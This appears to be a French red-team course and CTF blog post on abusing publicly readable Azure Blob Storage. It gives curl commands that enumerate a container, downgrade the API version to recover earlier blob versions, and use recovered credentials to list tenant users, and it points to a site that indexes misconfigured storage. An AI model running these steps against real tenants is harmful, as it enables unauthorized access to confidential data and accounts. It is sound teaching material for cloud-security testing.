+++
author = "Enzo"
title = "Azure - Blob Storage"
date = "2026-06-23"
categories = [
    "Red Team"
]
tags = [
    "AD",
    "Azure",
    "CTF",
    "Cours"
]
+++
# Azure - Blob Storage

## C'est quoi ? 
Le Blob Storage (Binary Large Object) est un service de stockage cloud conçu pour stocker des données non structurées de grande taille. On parle de fichiers bruts : images, vidéos, documents PDF, backups, logs, etc.

Les grands fournisseurs cloud proposent leur propre version :
 - Azure Blob Storage (Microsoft)
 - Amazon S3 (AWS)
 - Google Cloud Storage (GCP)

Généralement, un Blob Storage va stocker des fichiers, des backups, des APK, des ISO etc.

Ce qui est intéressant dans cas c'est que ces Blob Storage peuvent être paramétré en public et là ça devient intéressant car nous pouvons y retrouver des données confidentiel. 

## Exploitation

Lister les Blolbs du container :
````bash
curl 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list'

StatusCode        : 200
StatusDescription : OK
Content           : ï»¿<?xml version="1.0" encoding="utf-8"?><EnumerationResults
                    ContainerName="https://mbtwebsite.blob.core.windows.net/$web"><Blobs><Blob><Name>index.html</Name><Url>https://mbtwebsite.blob.core.windows...
RawContent        : HTTP/1.1 200 OK
                    Transfer-Encoding: chunked
                    x-ms-request-id: efa360aa-701e-002b-3828-03fc1e000000
                    x-ms-version: 2009-09-19
                    Access-Control-Allow-Origin: *
                    Content-Type: application/xml
                    Date: Tue, ...
Forms             : {}
Headers           : {[Transfer-Encoding, chunked], [x-ms-request-id, efa360aa-701e-002b-3828-03fc1e000000], [x-ms-version, 2009-09-19], [Access-Control-Allow-Origin, *]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 8515
````

Lister uniquement les répertoires (délimiteur /) : 
````Bash
curl 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&delimiter=%2F'

StatusCode        : 200
StatusDescription : OK
Content           : ï»¿<?xml version="1.0" encoding="utf-8"?><EnumerationResults
                    ContainerName="https://mbtwebsite.blob.core.windows.net/$web"><Delimiter>/</Delimiter><Blobs><Blob><Name>index.html</Name><Url>https://mbtw...
RawContent        : HTTP/1.1 200 OK
                    Transfer-Encoding: chunked
                    x-ms-request-id: efa3ae3f-701e-002b-0528-03fc1e000000
                    x-ms-version: 2009-09-19
                    Access-Control-Allow-Origin: *
                    Content-Type: application/xml
                    Date: Tue, ...
Forms             : {}
Headers           : {[Transfer-Encoding, chunked], [x-ms-request-id, efa3ae3f-701e-002b-0528-03fc1e000000], [x-ms-version, 2009-09-19], [Access-Control-Allow-Origin, *]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 710
````

Récupérer les versions précedente : 
Pour récupérer les versions précedente, nous devons faire appel au paramètre `include` avec la valeur `versions` hors dans l'API actuelle il est impossible de faire cette appel, il faut donc downgrade la version de l'API : 
````Bash
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmllint --format -

curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmllint --format -
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100  12880   0  12880   0      0  23626      0                              0
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://mbtwebsite.blob.core.windows.net/" ContainerName="$web">
  <Blobs>
    <Blob>
      <Name>index.html</Name>
      <VersionId>2023-10-20T20:08:20.2966464Z</VersionId>
      <IsCurrentVersion>true</IsCurrentVersion>
      <Properties>
        <Creation-Time>Fri, 20 Oct 2023 20:08:20 GMT</Creation-Time>
        <Last-Modified>Fri, 20 Oct 2023 20:08:20 GMT</Last-Modified>
        <Etag>0x8DBD1A84E6455C0</Etag>
        <Content-Length>782359</Content-Length>
        <Content-Type>text/html</Content-Type>
        <Content-Encoding/>
        <Content-Language/>
        <Content-CRC64/>
        <Content-MD5>JSe+sM+pXGAEFInxDgv4CA==</Content-MD5>
        <Cache-Control/>
        <Content-Disposition/>
        <BlobType>BlockBlob</BlobType>
        <AccessTier>Hot</AccessTier>
        <AccessTierInferred>true</AccessTierInferred>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <ServerEncrypted>true</ServerEncrypted>
      </Properties>
      <OrMetadata/>
    </Blob>
    <Blob>
      <Name>scripts-transfer.zip</Name>
      <VersionId>2025-08-07T21:08:03.6678148Z</VersionId>
      <Properties>
        <Creation-Time>Thu, 07 Aug 2025 21:08:03 GMT</Creation-Time>
        <Last-Modified>Thu, 07 Aug 2025 21:08:03 GMT</Last-Modified>
        <Etag>0x8DDD5F67FA52204</Etag>
        <Content-Length>1484</Content-Length>
        <Content-Type>application/zip</Content-Type>
        <Content-Encoding/>
        <Content-Language/>
        <Content-CRC64/>
        <Content-MD5>FqTnFqtz+FPCoF81Hzh0rQ==</Content-MD5>
        <Cache-Control/>
        <Content-Disposition/>
        <BlobType>BlockBlob</BlobType>
        <AccessTier>Hot</AccessTier>
        <AccessTierInferred>true</AccessTierInferred>
        <ServerEncrypted>true</ServerEncrypted>
      </Properties>
      <OrMetadata/>
    </Blob>
...
````
Ici nous voyons un fichier zippé 

Importation des modules nécessaire à l'exécution de ce script :
````Powershell
Install-Module -Name Az
Install-Module -Name MSAL.PS
````

Lancement du script et connexion au tenant avec les identifiants de connexion retrouvé dans le premier script : 
````Powershell
./entra_users.ps1
To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the code GZCQH9PB2 to authenticate.

displayName                                                 userPrincipalName
-----------                                                 -----------------
Akari Fukimo                                                Akari.Fukimo@domaine.com
Akira Suzuki                                                Akira.Suzuki@domaine.com
Angelina Lee                                                alee@domaine.com
Alex Rivera                                                 alex.rivera@domaine.com
Alexandra Wu                                                Alexandra.Wu@domaine.com
Alice Garcia                                                Alice.Garcia@domaine.com
[...]                                                 Sam.Olsson@domaine.com
````
Avec cette faille nous avons donc un pied (un peu plus même car nous sommes administrateur) dans l'infra cloud de ce domaine. 

## Autres méthode 
Pour énumérer les Blob Storage qui sont mal configurer nous pouvons jeter un oeil sur le site [https://grayhatwarfare.com/](https://grayhatwarfare.com/), qui répertorit les sites/entreprise ayant des Blob Storage mal configuré et vulnérable.